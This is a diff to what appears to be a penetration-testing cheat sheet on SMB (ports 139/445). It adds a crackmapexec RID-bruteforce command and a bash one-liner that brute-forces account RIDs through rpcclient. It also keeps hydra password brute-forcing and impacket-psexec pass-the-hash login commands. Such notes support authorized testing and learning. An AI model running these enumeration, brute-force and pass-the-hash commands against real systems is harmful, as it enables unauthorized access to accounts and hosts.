@@ -9,7 +9,7 @@ layout:
   outline:
     visible: true
   pagination:
-    visible: true
+    visible: false
 ---
 
 # 139,445 - SMB
@@ -98,8 +98,8 @@ crackmapexec smb $IP
 # Listing shares/permissions
 crackmapexec smb $IP --shares -u "" -p ""
 
-# Enum user for ASREPRoast attack
-crackmapexec smb $IP -u /worlists/users.txt -p "" -k
+# RID bruteforce
+crackmapexec smb $IP -u 'anonymous' -p '' --rid-brute
 ```
 
 ## Rpcclient
@@ -112,7 +112,11 @@ rpcclient -U admin%passwd123 $IP       # auth sessions
     > lookupnames admin         # enum user 
     > enumdomgroups             # enum groups
     > netshareenumall           # listing all shares
-    > netsharegetinfo <share>   # more info about the share    
+    > netsharegetinfo <share>   # more info about the share
+    
+# Bash onliner RID bruteforce
+# get the SID from administrator [> lookupnames administrator]
+for i in $(seq 500 5000); do rpcclient -N -U "" --password=anonymous $IP -c "lookupsids S-1-5-21-4078382237-1492182817-2568127209-$i"; done | grep -v "unknown"
 ```
 
 ## Enum4Linux
@@ -172,15 +176,15 @@ nmblookup -A $IP
 hydra -l "admin" -P /wordlists/passwords.txt $IP smb
 ```
 
-## Impacket-PsExec.py & PsExec.exe
+## PsExec.py & PsExec.exe
 
 ```bash
 # Login with AUTHENTICATION (prompt password)
 impacket-psexec.py Administrator@$IP
 
 # Login with HASH
-impacket-psexec.py Administrator@$IP -hashes <hash>
-impacket-psexec.py example.local/Administrator@$IP -hashes <hash>
+impacket-psexec.py Administrator@$IP -hashes <hash:hash>
+impacket-psexec.py example.local/Administrator@$IP -hashes <hash:hash>
 ```
 
 ## MSFconsole
